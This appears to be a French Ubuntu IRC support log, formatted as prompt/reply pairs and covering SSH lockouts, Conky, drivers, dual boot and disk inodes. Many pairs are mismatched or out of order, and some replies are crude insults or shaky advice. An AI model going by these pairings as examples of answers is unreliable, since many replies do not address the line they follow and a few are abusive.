en gros, j'aimerais pouvoir brancher un vga et usb provenant de ce serveur sur je ne sais quelle entrée sur le pc, ça serait moins cher que d'acheter un écran je pense	Une simple liaison réseau suffit.
???	non, c'est un langage propre à Conky, cf man conky
Conky: statfs64 '/point/de/montage/': No such file or directory	faut pas juste copier/coller le script, tu dois l'adapter
re	too fast
Marmotte tu est toujour la	tu l'as mis où ton .conykrc ?
j'ai testé depuis un autre serveur, et j'ai la même erreur	....Tu dois réinstialiser le ssh. Essaye un simple reboot sinon remmettre me mot de passe.
....Tu dois réinstialiser le ssh. Essaye un simple reboot sinon remmettre me mot de passe.	Un redémarrage simple a résolu le problème, tu as une idée de l'origine de cette erreur ? Histoire d'éviter que ça ne revienne ?
Un redémarrage simple a résolu le problème, tu as une idée de l'origine de cette erreur ? Histoire d'éviter que ça ne revienne ?	le service a planté, cela peut arriver
Comment je peux faire ça davlefou ? Avec les raccourcis c'est pas faisable non ?	tu peux substituer les codes touches.
Bon je la pose, comment puis-je remplacer une touche par une combinaison "d'évènements" ? Je voudrais que "c" soit remplacé par "x" puis une pause de quelques ms puis un autre "x", c'est possible ?	oui
je n'ai que le manager ^^	tu n'a pas le choix, tu dois passer en mode rescue
tu n'a pas le choix, tu dois passer en mode rescue	ah ? J'ai pourtant déjà fait des reboot sans passer par le mode rescue depuis le manager....
ah ? J'ai pourtant déjà fait des reboot sans passer par le mode rescue depuis le manager....	ton probléme n'est pas que tu ne peux te log?
Pourquoi passer par le mode rescue davlefouAMD ? Pourquoi pas redémarrer directement ?	tu accédes à ta machine? Je croyais que tu n'arrive pas a te connecter en ssh?
hum... toujours sur mon problème XD Je remarque que je peux même pas faire de ping >< ping: socket: Operation not permitted Mon firefwall a dû partir en cacahuète XD	es ce que port ssh est ouvert?
pour moi c'est assez cher... vu mon age...	tu as quel age?
*De rien	un vps coût 2€/mois en pris d'appels
J'aimerai un peu d'aide sur un prolème... qui me fais du souci ^^ Je ne peux plus me connecter à mon serveur dédié via ssh (seul moyen utilisé jusqu'ici)... J'ai cette erreur qui m'est renvoyé : ssh_exchange_identification: Connection closed by remote host Dans les solutions que j'ai trouvé, il faut toujours avoir la main sur le serveur pour modifier des fichiers... Or je ne l'ai pas. Merci de votre aide.	doit y avoir un systeme de rescue sur ton dédié
mon tableau de bord est tous ratatiner vers la gauche (reseau, son, ...)	unity ?
irssi ? ^^	arrête ton troll
c'est possible d'afficher l'historique sur le salon ?	c'est à ton client de gérer ça
c'est pas avec ce genre de commentaires que tu vas avoir de l'aide	j'ai trouve par moi meme.
Bonjour, question rapide , j'aimerais savoir si league of legend fonctionne correctement sous ubuntu (15.04 par exemple) toute information / avis est bon a prendre merci =)  /// Hi evrybody i need ask if League of legend work in ubuntu (Gnu-Linux debian-like)  evry comment is good for me thanks =)	c'est un chan français, pas besoin de copier en anglais :)
Ou VMware Workstation, mais je crois qu'il est payant.	Ca ne l'est pas. C'est dans les versions de SSE qu'il y a de plus en plus d'instructions gérant la virtualisation. Wikipedia te l'expliquera.
pz3Gull    la virtualisation tu fais sa avec quel logiciel	Ce qu'il faut faire précisément: http://windows.microsoft.com/fr-FR/windows-8/how-shut-down-turn-off-pc .
Narmos   oui en faite windows serai en marche si j'ai bien compri	j'avais eu le souci, il faut désactiver le démarrage rapide dans windows, je vais voir si je retrouve le lien avec la solution
@clache, un Intel i5 ça passe ?	Ca doit avoir le bon jeu d'instructions, mais je ne connais pas les intel.
Je veux dire, comparé à Wine.	Avec les processeurs récents, oui.
@clache, c'était absolument sans méchanceté, et ma remarque ne visait pas les utilisateurs.	Je ne pensais pas aux utilisateurs, mais aux choix faits par les développeurs.
Windows peut tourner, enfin "hiberner", même après avoir rebooté sur un autre système/live cd ou usb ?	Oui.
AlexxC bonsoir	Je ne connais pas windows 8.1. Fais une petite recherche.
donc je doit tout metre sur le dd externe	Non, windows est seulement hiberné. Eteins-le vraiment et tu pourras monter la partition.
pas écoute merci	Tu ne parle pas anglais? C'est on ne peut plus clair:Windows is hibernated, refused to mount.
salut clache, c'est à dire ?	Que ça dépend de ton modèle.
J'ai déjà un peu touché à ça. On crée une partition FAT32 au tout début du disque et on l'enclenche avec fdisk c'est ça ?	Je ne sais pas.
Salut, quelqu'un connait la manip' pour recréer une partition EFI quand on a supprimer toute les partitions Windows ?	Gparted.
non :(	merci quand meme ;)
c'est toujours l'Intel par défaut...	c'est ce que j'ai constaté effectivement, et si on souhaite utiliser la carte nvidia, sais-tu comment faire ?
"GNOME nautilus", un gestionnaire de fichier	 je n'ai jamais eu ça moi
E: Impossible de trouver le paquet vpnautoconnect_2.1.0ubuntu5_i386.deb	juste apt-get purge vpnautoconnect
Mon network manager a disparu de la barre de notification et ca ne marche pas la connection auto	essaie avec apt-get purge nomdupaquet
il parait que c est très simple :/	Regarde http://sourceforge.net/projects/vpnautoconnect/files/?source=navbar .
Yes, ben c est pour ca que je suis la, pour me former, je cherche juste à lancer mon vpn au démarrage	http://sourceforge.net/projects/vpnautoconnect/files/vpnautoconnect_2.1.0ubuntu5_i386.deb/download .
Si tu peux me dire comment lancer le vpn au démarrage facilement, je suis preneur	La doc est clair, soit tu prends le paquet déjà compilé, soit tu prends les sources. Tu as fais le second choix, sauf qu'ils ont apparemment changé le format de l'archive, donc il faut trouver les nouvelles instructions.
et chaque fois que je telecharge un truc c est un .tar.gz	un .tar.gz c'est une archive, au meme titre qu'un .zip ou un .rar ou un .7z, juste des fichiers compressés
oui je sais , mais ca ne marche pas	Si tu ne dis pas quelle erreur tu as eu après quelle commande personne ne pourra t'aider.
http://doc.ubuntu-fr.org/vpnautoconnect	Il faut taper les commandes dans un terminal.
Quelqu'un peut m expliquer ?	Tu dois avoir un utilitaire graphique qui te permet de voir le contenu de ton archive.
<mezen> jpe méme pas faire de copier colé la touche "v" ne marche pas	laisse tomber
<mezen> je peut pas taper la comande il y a des touche qui marche pas	ok
mezen la sa boot bien sur le disque lbuntu , choi de la langue ,ect....	quand t'es sur le bureau, ouvre un terminal
mezen ba rien sa fait écren noir et retour au choi du boot	ok et quand tu choisis cdrom (avec le disque lubuntu inséré)?
mezen	oui et donc, quand tu choisis hdd, ça fait quoi ?
jai du choper une saloperie	et F2, t'es sûr de cette touche ?
mezen   machine sous amd turion 64 mobile + 512 Mo de ram	pour avoir windows, il faut au moins une partition sur ton disque dur, pour avoir ubuntu il te faut au moins une aussi, et pour avoir les deux en dual boot, il te faut 2 partitions au minimum
ba j'ai l'inprétion mais il me mais quand méme 20 giga de libre et méme sous lbuntu ils y a des touches qui ne marche pas don les touche F	20 Go sur quelle partition ? et du coup t'as combien de partitions sur ton disque ?
mezen  j'ai lancer lbuntu en live cd pour voir mon disque dur et au moin récupérer mes donner mais il ne me trouve q'un disque dur de 20 Giga sur les 80 a l'origine , de plus les 20 giga sont vide	disque mort ?
et .config/libreoffice	Je suis sur ma nouvelle lubuntu15.04. Mais il y a 2 mois, je n'avais eu aucun souci pour l'installer sur ma 14.10(c'était des versions précédentes). Je vais être bon pour effacer mon profil libre office... Merci de tes réponses. Vu que l'installation est neuve, autant attaquer le profil que de piocher au hasard.
je peux essayer et te dire si ça marche chez moi	Pourtant dans le Gestionnaire d'extension, elle est ok. Ca vient de http://www.dicollecte.org/grammalecte/telecharger.php .
Pourtant dans le Gestionnaire d'extension, elle est ok. Ca vient de http://www.dicollecte.org/grammalecte/telecharger.php .	libreoffice --version
libreoffice --version	4.4.2.2.
4.4.2.2.	je télécharge, je vais l'essayer
je télécharge, je vais l'essayer	Et j'ai une erreur si je tente de désinstaller l'extension:(com.sun.star.lang.IllegalArgumentException) { { { Message = "Impossible de d\X00e9tecter le type de m\X00e9dia :
Et j'ai une erreur si je tente de désinstaller l'extension:(com.sun.star.lang.IllegalArgumentException) { { { Message = "Impossible de d\X00e9tecter le type de m\X00e9dia :	désolé je vois pas ton problème, à ta place j'essaierai de déplace ou renommer .conf/libreoffice et relancer
mezen encor dsl quesque tu compren pas	pourquoi tu n'as plus windows ? veux-tu introduire ton problème déjà et ce que tu as fait ?
mezen dsl je suis dislésique et du coup j'écri comme j'enten les sons ex:mais m'est mes pour moi c'est le méme sons croi moi c'est pas facil tout les jour	pas de problème pour moi, mais avec ces fautes c'est moins facile à te comprendre
si vous avez des questions, je suis là	Je viens d'installer l'extension grammalecte pour libre office et elle ne marche pas. Elle n'est même pas dans le menu.
Je viens d'installer l'extension grammalecte pour libre office et elle ne marche pas. Elle n'est même pas dans le menu.	la désinstallation marche sans problème chez moi
windows ne démar plus jai teste lbuntu en boot pour voir si les touche remarche mais jme suis apérsu que méme au momen du démarage la ou tu appui sur f2 pour acséder au bois les touche ne marche pas non plus	tu fais beaucoup de fautes par contre
quel âge as-tu ?	je ne répond plus aux questions impertinentes :)
j'ai une question , j'ai un de mes PC ou le clavier bug , il a des touche qui ne marche plus et sa du jour au lendemain	nettoie el
avec un domaine tu peux avoir ton site, tu peux héberger des serveurs de jeux, faire un ownCloud, et bien d'autres :p	effectivement vlc convertir plusieurs formats de fichiers multimédia.
mais avec 5 € je peux tenir 3 moi si je veux c'est ça l'idée :p	1er résultat de duckduckgo http://www.hebergement-gratuit.com/ .
ouai chépas exactement combien de kilo ça fait	avec 5€ pour trois mois t'envoies pas de données :D
mdr	Tu payes ton riz cher mais tu manges peu.
mais moi je veux que mon fichier soit sur le web	les 5 €/mois dont je parlais c'est un investissement qui vaut le coup
purée j'ai vraiment l'impression que vous vous moquez de moi là ^^	ben oui, mon Linode est sur le Web.
je souhaite transformer du fichier video mp4 en fichier mp3 pouvez vous m'eguiller ?	VLC permet d'extraire le son si je me souviens bien
pfff vous êtes sérieu là ?	17:15:23          Calinou | VPS = virtual private server
pc'est quoi un VPS ?	ça doit être normal.
la pour récapituler, l'utilisateur est créé au démarrage avec rc.local, et une fois sur le menu de lightdm je dois attendre 15secondes (sans comprendre d'où ça peut venir) avant de voir apparaitre ce nouvel utilisateur	oui mais il faut garder ton PC allumé
…	tu ouvres ta box sur un certain port et fais tourner un apache sinon
moi je voudrais que quand je clique sur le fichier, ça télécharge direct	si ça fait des liens directs...
je vois pas pourquoi je payerais pour un service pareil, y en avais plin avant	t'as tout les trucs remplis de pub genre 1fichier
?	j'utilisais greeter-setup-script pour lancer mon bouzin, et (me semble-t-il) je ne pouvais pas ajouter d'utilisateur
(tu devrais lire le pastebin jeanjack ça te concerne un peu)	Le search plugin de la doc ou un https://doc.ubuntu-fr.org/ en raccourci sont super efficace.
Le search plugin de la doc ou un https://doc.ubuntu-fr.org/ en raccourci sont super efficace.	d'un côté nous sommes ici pour _essayer_ d'aider les utilisateurs, si même les alias prévus à cet effet deviennent du flood …
d'un côté nous sommes ici pour _essayer_ d'aider les utilisateurs, si même les alias prévus à cet effet deviennent du flood …	Sur ma connexion mauvaise, je suis plus rapide ainsi, mais je te laisse choisir.
tu parles de ça ? https://help.ubuntu.com/community/CustomizeGuestSession	ça aurait pu être un bon début mais la mon script est fin prêt ( et fort dégeulasse mais bon, c'est autre chose )
c'est une premiere piste jeanjack	tu sais, ton navigateur a très probablement une fonction de recherche qui te coûterait moins de temps que de demander un lien à un bot
comment je peux faire pour remettre ça en ordre ?	pour les trucs qui appartiennent normalement à root, tu peux refaire un chown, mais tout n'appartient pas à root à la base
si quelqu'un a une petite idée de ce qui se passe, je suis preneur	deux DHCP, dont un qui ne donne pas les bonnes infos de DNS ?
deux DHCP, dont un qui ne donne pas les bonnes infos de DNS ?	c'est une connexion wifi et derrière l'access point y'en a qu'un seul
c'est ça qui est drôle beaver :D	^^
salut et fraternité!   Y aurait-il quelqu'un-e en mesure de récupérer des données sur une clé usb et sur un disque dur qui sont passés en raw?	hello, http://doc.ubuntu-fr.org/tutoriel/recuperer_donnees_disque_dur_raw ?
pfiou, y'a de quoi perdre son Latin ^^	En tous cas, merci de tes lumières. ;-)
ça permet de cerner d'ou vient le probleme, si il faut le kernel n'a rien à voir	Car là, pour tester le -41 sur la 14.10, il faut que je reboote la 15.04 y faire le update-grub car c'est son grub qui est installé sur le disque.
tu seras fixé si ça vient de la màj kernel ou pas	Mais non, je m'en fous de cette lumière.
06/16/15 00:08   beaver: je viens d'avoir la màj kernel aussi au pire tu peux apt-get changelog linux-image-3.16.0-39-generic	Oui,mais je ne suis pas sur que celui la corrige. Je n'ai pas redémarré puisqu'on discute. ;-)
je laisse mon tour à quelqu'un d'autre, bon courage clache & bye le channel	Merci.
pas evident :/	Ca c'est que corrigeait le -39. Mais justement, je le suspecte d'avoir introduit ce bug. Déjà que j'ai un bouton power super lumineux qui sert à rien... On dirait une machine de tuning...
je regarde	Pour le kern.log , c'est complexe, car lorsque ma carte wifi a du mal, je dois souvent l'éteindre pour la redémarrer. Car si elle voit toujours des réseaux, elle semble chercher dans le vide. Ce n'est qu'une impression, mais quand elle cherche vraiment, elle me redemande le mot de passe continuellement(au moins une fois pas minute). Quand elle chercher sans me le demander depuis 10 minutes, je
le créateur de configuration, mais oui	Oui en le cherchant, j'ai compris.
ah egalement, je trouve rien de plus sur mon moteur de recherche	Dans le même genre, hier je lisais le code de grub-mkconfig pour savoir où sont les fichiers de traductions... Je n'ai toujours pas trouvé...
06/16/15 00:55   ~clache: Il y a tous les changelog depuis le 2.6.30-1.1...	Ouais, bah là je regardais ton lien. Je connais le C, mais ce source ne m'apprend vraiment rien ;-) . Ils sont bons ceux qui s'y retrouvent dans ce fatras de fichiers.
Parser/loader for IHEX formatted data	J'ai vu que j'avais des fichiers ihex.h mais je n'ai pas cherché plus loin. Ce n'est pas grave.
il y'a des corrections concernant certains chipsets wifi, mais je vois rien qui touche la "lumière"	Oui, je n'ai pas fini de le lire, mais j'ai vu quelques chipsets qui ne me concernaient pas. Par contre, c'est vraiment un style télégraphique...
?	Exact, je venais de le retrouver.
ah ^^	Oui depuis 2-3 ans, les LTS migrent de kernel. Je sais plus le nom stack machin.
tu remplaceras le nom du package clache bien entendu (apres ta màj) :)	C'est le même, mais j'y avais pensé. :-)
:)	Mais, là, il faut attendre la fin de la mise à jour, car apt-get est déjà utilisé...
et pourtant c'est merveilleux	Je le regarde pour Firefox sauf quand je suis trop occupé.
ah :)	J'ai jamais pensé à regarder le changelog.
je viens d'avoir la màj kernel aussi au pire tu peux apt-get changelog linux-image-3.16.0-39-generic	Non, la 14.10 et 15.04.
Il y a encore une mise à jour de kernel... Ca va peut être corriger la régression.	tu utilises la version 14.04 d'Ubuntu non ?
J'ai voulu m'installer Xubuntu et les autres variantes ce soir, juste pour tester. Ma clé est trop petite... Je reste donc en Lubuntu... Qui me va à ravir.	peut-être?
peut-être?	As-tu regardé https://doc.ubuntu-fr.org/scanner ?
Même sans GUI j'en doute fort	le support officiel de debian est sur oftc, pas freenode, mais sur freenode il y a #debianfr et #debian-facile qui sont actifs
le support officiel de debian est sur oftc, pas freenode, mais sur freenode il y a #debianfr et #debian-facile qui sont actifs	Super je m'y rendrai la prochaine fois, c'est vrai que j'ai souvent l'habitude de m'adresser à la communauté ubuntu pour les debian based
Super je m'y rendrai la prochaine fois, c'est vrai que j'ai souvent l'habitude de m'adresser à la communauté ubuntu pour les debian based	et oui, il y a beaucoup trop de divergences entre debian, ubuntu et les autres distros dérivées debian pour faire le support au meme endroit
et oui, il y a beaucoup trop de divergences entre debian, ubuntu et les autres distros dérivées debian pour faire le support au meme endroit	Ca marche, merci en tout cas ;)
Ou est le respect	Debian tient sur une clé usb de 1Gio?
C pas les blaireau de fedora quand même xDDD	Lis le premier commentaire de http://linuxfr.org/news/ubuntu-party-paris-mai-2015-appel-a-conference .
Merci pour votre aide en tout cas	J'ai des traces écrites...
Bah c'est en voyant ca que j'ai commencé à flipper : http://www.speedguide.net/port.php?port=8090	 ça ne changera pas grand chose si tu es sur le réseau local
sudo netstat -antp | grep ':8090'	8090
ici c'est le channel de support pour Ubuntu stable	d'accord. desole.
ioops:	c est aussi dans les preferences de nautilus accessible depuis dconf-editor?
tu as quoi comme valeur pour secondary click time ?	je regarde. deux min :)
moi a ta place je reinstalation mais je n'y connai pas grand chose	merci
cacher une machine sur le reseau peut etre utile quand on pirate un reseau mais on peut pas le faire pour un serveur par exemple	Mon but n'est pas de pirater.
quel est linteret de changer d'adresse mac	A cacher la machine.
bonsoir	bonsoir tu connais Alex H
Autre chose qui ne va pas, impossible de se connecter avec une adresse Mac clonée.	ça c'est normal, tu ne peux jamais avoir 2 fois la meme adresse mac dans un réseau local.
ça c'est normal, tu ne peux jamais avoir 2 fois la meme adresse mac dans un réseau local.	Ca remplace ta vraie adresse Mac par une au choix.
Ton mot de passe ?	apparemment personne a vu mais j'essayais de m'identfier mais je ny arrivais pas
!wiki ubuntu-software	http://doc.ubuntu-fr.org/rubyripper | http://doc.ubuntu-fr.org/apt | http://doc.ubuntu-fr.org/handbrake | http://doc.ubuntu-fr.org/karmic | http://doc.ubuntu-fr.org/gestionnaire_de_paquets
je vais quand même poser la question là-bas	c'était une double-réponse, c'est pas l'annuaire ici :p
ba dsl d'étre dislésique	i386/486/586/686 = 32 bits, la différence c'est l'ancienneté du processeur et surtout ce qu'il supporte
Bon, je vais quand même faire comme ça (avec -c en paramètre). Merci !	ça dépend de tes usages, mais tu peux fixer ça direct dans ton xorg.conf
*quel	tu teste dans la zone de saisie
bein pas pour en débattre ou en faire du support piti oui j'en ai conscience, mais ça reste un logiciel libre :/, si par simple hasard un dev voit mon message, le drame peut être évité :/	fais un courriel aux développeurs
si il y'a un dev' de nodebb sur ce channel, l'intégralité des pseudonymes de votre site peuvent être lock par n'importe quel utilisateur …	pas l'endroit
!wiki conky	http://doc.ubuntu-fr.org/conky | http://doc.ubuntu-fr.org/conky_scripts_systeme | http://doc.ubuntu-fr.org/conkyforecast | http://doc.ubuntu-fr.org/conky_scripts_temps_et_meteo | http://doc.ubuntu-fr.org/conky_scripts_multimedia
!oran	merci de ne pas jouer avec le bot, il peut être assez agressif
!ot	pour discuter d'autres choses que du support, merci de taper /join #ubuntu-fr-offtopic
éséye pitivi il a pas l'air trop compliquer	ok merci je vais check
tu cherche a faire une vidéo diaporama de tes photo sur un font musical ?	exact
:D	debian.
pour les photo a imprimer esai le logiciel shotwell	j'ai pas l'impression qu'il aie une option pour imprimer plusieurs photos à la fois
je ne vois aucune trace de mon lecteur de carte sim intégré dans lshw, comment je fais pour avoir quelques infos, genre marque/modèle/… ?	 lspci -k
Sinon on peut parler de HS sur le chan offtopic ? :x	c'est encore un chan off avec des cons ?
EN score HTML5 :')	sinon, tu es pas sur epiknet toi ?
sinon, tu es pas sur epiknet toi ?	Si
Ahaha Konqueror sous KHTML : YOUR BROWSER SCORES 83 OUT OF 555 POINTS	sachant que KHTML est tout de meme le papa de webkit…
sachant que KHTML est tout de meme le papa de webkit…	Et sous Konqueror 4.x tu peux changer le moteur de rendu
youtube-dl ou mplayer ou vlc c'pas mal aussi	Yep je sais
Les utilises pas	Bah ouais mais quand ta pas le choix ?
et dis adieu à Youtube	pas forcément
c'est clair que ça sert à rien de se casser le cul avec un environnement léger alors que le navigateur est un OS à lui seul	Youtube osef ça utilise HTML5
vire le flash	J'en ai pas :x
c'est ?	http://img11.hostingpics.net/pics/629256kinfocenter.png ^^
e17 c'est largement mieux coté visuel et pourtant ça prend quedal	Cela dit, contrairement à ce que tu peux croire, ce n'est pas KDE qui bouffe le plus d'énergie sur mon PC
plasma c'trop lourd pour ce que c'est	Bof
J'ai Plasma 5.3.90	plasma tu peux te le rentrer dans le cul aussi.
plasma tu peux te le rentrer dans le cul aussi.	.... Soit c'était profondément mauvais, soit c'était nul, soit je n'ai pas compris la substantifique finalité constituant ta blague :/
mais ça sera sous Arch je pense	Et c'est ce que j'ai :D
c'toi le chou	tu pourras plus lancer unity quoi
ahah	o/
par la console du GRUB ?	non, depuis un terminal
donc le DE n'a rien à voir avec le GTK et le WM	donc, une wm seule, c'mieux.
ah ok donc ça intervient tout à la fin en fait	c'est mieux directement un wm.
j'aimerais passer d'Unity/GNOME à KDE tout en gardant Ubuntu, c'est possible sans devoir tout réinstaller avec Kubuntu ?	oui, il te suffit d'installer le meta-paquet "kubuntu-desktop"
bonjour à tous je cherche une commande windows pour rechercher des fichiers dans une aborescence à partir d'un motif, une sorte d'équivalent de find sous gnu/linux	 essaye find comme sous windows...
 essaye find comme sous windows...	find de windows permet de chercher un terme dans un fichier, c'est un sorte de grep emputé en gros
donc j'imagine que mon probleme vient du BIOS	momodeset c'est plus une option en rapport avec la carte graphique
ok bah merci beaucoup, je vais noter sa dans un coin pour le cas ou :)	je m'en vais moi, bonne nuit ou soirée
je vois ma connexion filaire	t'as une entrée MTU ?
ok du coup en redémarrant sa pourrait marcher tu penses?	tu peux ouvrir network manager ?
tu peux ouvrir network manager ?	j'arrive à accéder à mon interface de Connexion réseau mais  pas à network manager
re, je viens de tester, mais sa marche toujours pas	modinfo alx
je dois faire un make ensuite mezen??	je sais pas, c'est pas la meme commande que dans le forum
oui du coup c'est aps un pb de driver alx, il y est. t'as une idée de comment gérer le bug?? Jcommance à être un peu fatigué et je danse demain :-)	j'essayerai ces commandes
c'est fais : http://pastebin.ubuntu.com/11704692/	tout en bas t'as la ligne configuration
mais similaire	tu peux faire?: sudo lshw -c network
je crois avoir trouvé le bug, le driver utilisé est alx https://bugs.launchpad.net/ubuntu/+source/linux/+bug/927782	j'ai déjà pensé à ça
bizarre, t'es sous la ubuntu classique? peut-être que ya des différences de kernels?	moi je n'ai pas ce intel_powerclamp
re mezen, sur ma xubuntu 15.04 le kernel est le 3.19.0-20-generic	ok, je ne sais pas pourquoi je ne suis pas à jour alors
inactif, ok merci wiki	par contre c'est quoi ta version de kernel ?
sa veut dire quoi idle??	peut etre pas en fait, je ne trouve pas de lien direct dans les forums
enfin j'en sais rien	c'est donc lié à intel_pwerclamp
http://doc.ubuntu-fr.org/asus_n76vm	t'as quoi quand tu tapes modinfo alx
oui et pas qu'un peu http://paste.ubuntu.com/11704334/	par contre ce link down arrive quand tu te connectes en wifi
j'ai bien tenté et sa n'a pas marché, par contre le wifi est nikel	quand tu tapes "dmesg" dans un terminal, t'as des erreurs ?
ensuite tu peux tuer le service	une mise à jour pourra le remettre en +x
ok je note ça, merci	que te donne la commande : locate hud-service
tu pourras les remettre dans quelques temps si le bug est corrigé	oui d'accord avec toi
lol m'en sers pas donc ça va^^ et s'il fallait que je change de bureau faute de solution à ce bug, vous me conseilleriez quoi?	une solution proposée est d'empêcher le lancement du service en enlevant les droits d'exécution
perso, j'ai du mal à franchir le cap pour unity. si toi t'arrives alors reste dessus	mieux vaut ne pas le désinstaller, ça risque de poser des soucis dans le futur
certains ont pensé que ça pouvait venir des marques-pages de Firefox, d'autres de Chromium, d'autres d'Emacs...bref.	il analyse les activités pour prédire ce que tu ferais/chercherais quand tu veux lancer une recherche etc
de rien :)	http://askubuntu.com/questions/526264/what-is-the-hud-service-responsible-for
lts???	Long Term Support, soutenue pendant 5 ans
ils vont finir par trouver une solution, t'as quoi comme version d'ubuntu akern ?	je suis sur la 14.04, avant je les suivais au fur et à mesure mais j'ai préféré me fixer
parce que tu utilises quoi de ton côté mezen ?	je suis sous gnome flashback
bah ouais mais Unity j'aime bien, je m'y retrouve très bien dessus, il y a juste ce foutu processus qui m'agace sinon j'y trouve mon compte	tu peux pas l'arreter ?
tu peux pas l'arreter ?	je peux l'arrêter en le tuant, j'ai tenté en me contentant de le "terminer" il n'a rien voulu savoir
Bref, tu m'as mis sur la voie et pour cela, je te remercie	la différence *principale* entre un hardlink et un symlink, c'est au niveau de l'inode
have fun	c'est pour un serveur de jeu donc je m'en fou
pour les jeux et quelques trucs, windows ça va, pour des trucs plus sérieux, voir professionnel, c'est ubuntu	http://askubuntu.com/questions/108771/what-is-the-difference-between-a-hard-link-and-a-symbolic-link
je dirais même 98% :)	oui mais, ayant déjà fait le test d'un symlink, j'ai constaté que je ne pouvais pas l'éditer
je vais chercher une explication plus simple pour mon cerveau Zic  que wikipedia mais merci	pour rester simple, un inode, c'est l'identifiant unique d'un groupe de donnée sur ton périphérique de stockage
pourriez-vous m'aider svp	pas vraiment compris ta question, c'est quoi le but ?
ah ouais tiens, il est revenu :)	j'ai pas compris ?
j'ai pas compris ?	ffmpeg a été retiré des dépôts officiels pour Ubuntu 14.04, mais il semble être revenu depuis la 15.04
ffmpeg a été retiré des dépôts officiels pour Ubuntu 14.04, mais il semble être revenu depuis la 15.04	certainement moi je l'ai en tout cas dans xubuntu 15.04
:D  en tout cas merci les gars pour votre dispo et vos conseil heuresement que y a des gens comme vous	donc, tu sais quoi faire pour le moment, plus qu'à t'y atteler ?
et quand on fait ca chez soi faut s inquieter ????	pas du tout :D
perso, mes serveurs @home, je les installe comme les autres machines, depuis un système PXE	voilà ou via un PXE :þ
pfff ... ben tiens , j arrive meme plus a acceder au shell ................................ franchement ce sra bien la premiere fois que quelque chose me donnera autant de fil a retordre	non
c'est pas commun d'installer un serveur depuis une clé USB faut dire :)	euh, je fais ça moi
attend jvais essayer	tu sais faire un chroot ?
pk ?	le device.map doit pointer sur hd1, et quand y'a plus la clé, le disque est hd0
vouii	c'est pour ça je pense
le probleme c est que quoi qu on fasse , il veut booter sur la clef usb	t'as installé depuis une clé ?
c'est donc évidemment une bonne idée de lacher ses nerfs sur des gens qui vont potentiellement passer du temps pour t'aider ?	c'est pas comme ça que les gens font à la poste ?
car on a pas la main	t'as un mode "rescue" ou dans le genre ?
qqn de dispo ?	pose plutôt ta quelques
parce que bon, dans un répertoire, les fichiers sont déjà censés être uniques ;-)	si tu avais bien lu la commande, c'est pour récupérer les noms des proprios et n'en afficher qu'une seule occurrence
@Surcouf, Donc les 70GO sont quand même utilisé, bien qu'il n'y est pas de partition particulière. C'est ça ?	pas de partition ?
je maintiens que c'est une mauvaise habitude de passer directement à sudo rm -rf	comme ton sort -u ? ;-)
D'accord. J'associe souvent les deux quand je fais du ménages. Mauvaise habitude.	ensuite, ton disque ne fait certainement pas exactement 1 To mais un peu moins
@nesthib, je pense que s'il n'est pas propriétaire du fichier, et s'il y a des dossiers... c'est bourrin mais ça marche à coup sûr !	mieux vaut comprendre les options qu'on utilise, sinon on fait vite des bêtises ;)
@Surcouf, j'ai pas touché au disque pendant l'installation. Mais effectivement, la partition principale est en ext4. Mais comme toujours, non ?	pour le récursif il y a -r, mais le -f est a priori inutile
@Surcouf, Oui, désolé, je suis allé vérifié ensuite. 5 0u disque ?	il faut savoir que, par défaut, 5 0e l'espace disque sera réservé à root
(sudo) rm -rf plutôt, non ?	tu ne l'aurais pas formaté en ext3/4 ?
Sur mon disque de 1TO, GParted ne reconnait que 930GO. Quelqu'un aurait une idée ?	pourquoi ? inutile d'utiliser sudo ou -f si on ne comprend pas pourquoi
Oups, je ne connaissais pas Kickstart désolé, je croyais que c'était pour installer des programmes.	kickstart est un système d'installation automatique et silencieux utilisé par RedHat et supporté également par Ubuntu
@Tutorious -> Ce ne serait pas plus simple d'utiliser la logitech/synaptic ou seulement apt-get ?	5% ?
réctification les icone de cadena sont sur les fichier dans la corbeil	fais un → ls -l ~/.local/share/Trash/files | awk '{print $3}' | sort -u
ici c'est un canal d'entraide, il faut faire avec la disponibilité des personnes connectées	c'est payant ?
pierre Bonjour depuis très longtemps je met des fichiers debian et  windows dans une partition NTFS. Je les ai sauvegardé dans une  fat mais je ne peux plus vérouiller   le vulume :sError locking device: cryptsetup exited with exit code 1: device-mapper: remove ioctl on   udisks-luks-uuid-586ea9d9-70de-45c3-b349-6656458c674c-uid1000 failed:  Device or resource busy	si c'est urgent, tu peux toujours appeler un service professionnel 24/24
:)	ta phrase me fait penser à ça xD https://www.youtube.com/watch?v=NMaUr02Kcfg , ghosty_ dans la logitheque ubuntu il suffit de taper le nom de ton logiciel, et de cliquer sur installer, et de taper ton mot de passe quand on te le demande :)
E: Le paquet linux-image-extra-3.16.0-31-generic doit être réinstallé, mais il est impossible de trouver son archive.	tu as quoi dans ton /etc/apt/sources.list
;'(	ça n'était aucunement drôle
merci	et si tu posais plutôt ta vraie question ?
je cherche des moyens pour sécure au max ma machine	la nsa propose une distro
ça prendra beaucoup moins de place :P	ça lui à fait du bien aux inodes :)
et de nettoyer ensuite tous les kernels et headers non utilisés	tar ou tar gz ?
ça prendra beaucoup moins d'inodes	et style les scp sur un autre serveur
et style les scp sur un autre serveur	enfin quelle que soit la méthode utilisée, je te conseille de déplacer ou sauvegarder un répertoire de headers, pour débloquer la situation
enfin quelle que soit la méthode utilisée, je te conseille de déplacer ou sauvegarder un répertoire de headers, pour débloquer la situation	ok thanks
et ma solution suppose que tu as de la ram libre ^^	et direct rm les headers d'un kernel non utilisé ça pose soucis ?
c'est pas dans /usr/src ? ou un truc du genre	je peux déplacer un des dossiers style linux-headers-3.16.0-36 sans que ça pose soucis ?
juste un peu de nettoyage à faire	je te dis ça
et tout est revenu dans l'ordre	il est ou le répertoire de headers ?
j'ai créé un ramdisk, déplacé un répertoire de headers dedans, juste pour libérer des inodes	effectivement http://pastebin.com/raw.php?i=mjTNh0Ez
je pense qu'un simple "sudo apt-get purge linux-headers-[les plus vieux]" suffirait	ben il veux pas tant que le soucis apt n'a pas été réglé
si tu as beaucoup de headers installés, ça fait énormément de petits fichiers	le soucis est là /dev/mapper/root        305216 296512      8704   98% /
pourtant mon disque n'est pas vraiment plein -> http://pastebin.com/raw.php?i=w7fbdYa5	df -i ?
apres ton kill ?	ça se conjugue tu pidoffes
c'etait quoi la commande qu'il falalitpas taper :p	t'es jaloux? tu veux un ban toi aussi ?
je tombe sur "comment ca marche " et le premier conseil est kill -9 PID	t'as pas de chance avec google
j'ai donc l'erreur  mysqld_safe Can't log to error log and syslog at the same time.  Remove all --log-error configuration options for --syslog to take effect.	essaie avec en plus l'option --skip-syslog
